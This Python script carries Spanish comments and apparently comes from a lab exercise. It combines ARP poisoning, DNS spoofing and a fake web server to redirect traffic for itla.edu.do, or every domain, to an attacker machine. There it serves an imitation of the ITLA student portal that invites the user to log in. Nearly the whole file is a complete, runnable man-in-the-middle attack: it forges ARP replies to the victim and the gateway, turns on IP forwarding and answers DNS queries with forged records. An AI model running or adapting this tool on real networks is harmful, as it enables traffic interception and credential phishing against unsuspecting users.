#!/usr/bin/env python3
"""
DNS Spoofing + ARP Poisoning + Servidor Web falso
Redirige itla.edu.do (y cualquier dominio) a Kali
"""

from scapy.all import *
import threading
import time
import os
import http.server
import socketserver

# ── Configuracion ─────────────────────────────────────────────────────────────
INTERFAZ     = "eth0"
IP_VICTIMA   = "15.0.7.7"
IP_GATEWAY   = "15.0.7.1"
IP_MALICIOSA = "15.0.7.2"
PUERTO_WEB   = 80

# Dominios a redirigir — None = redirige TODOS
# Para redirigir solo algunos: ["itla.edu.do.", "www.google.com."]
DOMINIOS_OBJETIVO = None


# ── Pagina falsa que vera la victima ──────────────────────────────────────────
PAGINA_FALSA = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ITLA - Instituto Tecnologico</title>
    <style>
        body { font-family: Arial, sans-serif; background: #003580; color: white;
               display: flex; justify-content: center; align-items: center;
               height: 100vh; margin: 0; flex-direction: column; }
        .logo { font-size: 60px; margin-bottom: 20px; }
        h1 { font-size: 36px; margin-bottom: 10px; }
        p  { font-size: 18px; opacity: 0.8; }
        .badge { background: #ff4444; padding: 8px 20px; border-radius: 20px;
                 font-size: 14px; margin-top: 30px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="logo">🎓</div>
    <h1>ITLA - Instituto Tecnologico</h1>
    <p>Portal Estudiantil — Inicia sesion para continuar</p>
    <div class="badge">⚠ INTERCEPTADO POR KALI ⚠</div>
</body>
</html>"""


# ── Servidor web falso ────────────────────────────────────────────────────────
class ServidorFalso(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PAGINA_FALSA.encode())

    def log_message(self, format, *args):
        print(f"[HTTP] Victima conectada → {self.client_address[0]} | {args[0]}")

def iniciar_servidor_web():
    try:
        with socketserver.TCPServer(("", PUERTO_WEB), ServidorFalso) as httpd:
            print(f"[+] Servidor web falso escuchando en puerto {PUERTO_WEB}")
            httpd.serve_forever()
    except PermissionError:
        print("[-] Puerto 80 requiere sudo — corre el script como root")
    except OSError as e:
        print(f"[-] Error servidor web: {e}")


# ── ARP Poisoning ─────────────────────────────────────────────────────────────
def get_mac(ip):
    arp    = ARP(pdst=ip)
    ether  = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(ether / arp, iface=INTERFAZ, timeout=3, verbose=0)[0]
    return result[0][1].hwsrc

def arp_poison(victima_ip, gateway_ip):
    victima_mac = get_mac(victima_ip)
    gateway_mac = get_mac(gateway_ip)
    print(f"[+] MAC Victima : {victima_mac}")
    print(f"[+] MAC Gateway : {gateway_mac}")

    while True:
        send(ARP(op=2, pdst=victima_ip,  hwdst=victima_mac, psrc=gateway_ip),
             iface=INTERFAZ, verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victima_ip),
             iface=INTERFAZ, verbose=0)
        time.sleep(1)


# ── DNS Spoofing ──────────────────────────────────────────────────────────────
def dns_spoof(pkt):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return

    dominio = pkt[DNS].qd.qname.decode()

    # Filtrar dominios si se configuraron
    if DOMINIOS_OBJETIVO and dominio not in DOMINIOS_OBJETIVO:
        return

    print(f"[*] DNS interceptado: {pkt[IP].src} → {dominio}")

    respuesta = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
        DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, rd=1, ra=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                type="A",
                ttl=10,
                rdata=IP_MALICIOSA
            )
        )
    )

    send(respuesta, iface=INTERFAZ, verbose=0)
    print(f"[!] Redirigido: {dominio} → {IP_MALICIOSA}  (abre tu web falsa)")


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print("=" * 52)
    print(f"  VICTIMA  : {IP_VICTIMA}")
    print(f"  GATEWAY  : {IP_GATEWAY}")
    print(f"  ATACANTE : {IP_MALICIOSA}")
    domstr = ", ".join(DOMINIOS_OBJETIVO) if DOMINIOS_OBJETIVO else "TODOS"
    print(f"  OBJETIVO : {domstr}")
    print("=" * 52)

    # IP Forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding activado")

    # Hilo: servidor web falso
    t_web = threading.Thread(target=iniciar_servidor_web, daemon=True)
    t_web.start()

    # Hilo: ARP poison
    t_arp = threading.Thread(target=arp_poison, args=(IP_VICTIMA, IP_GATEWAY), daemon=True)
    t_arp.start()
    print("[+] ARP Poisoning iniciado...")

    print("[+] Esperando consultas DNS...\n")

    # DNS sniff en hilo principal
    sniff(
        iface=INTERFAZ,
        filter="udp port 53",
        prn=dns_spoof,
        store=0
    )

if __name__ == "__main__":
    main()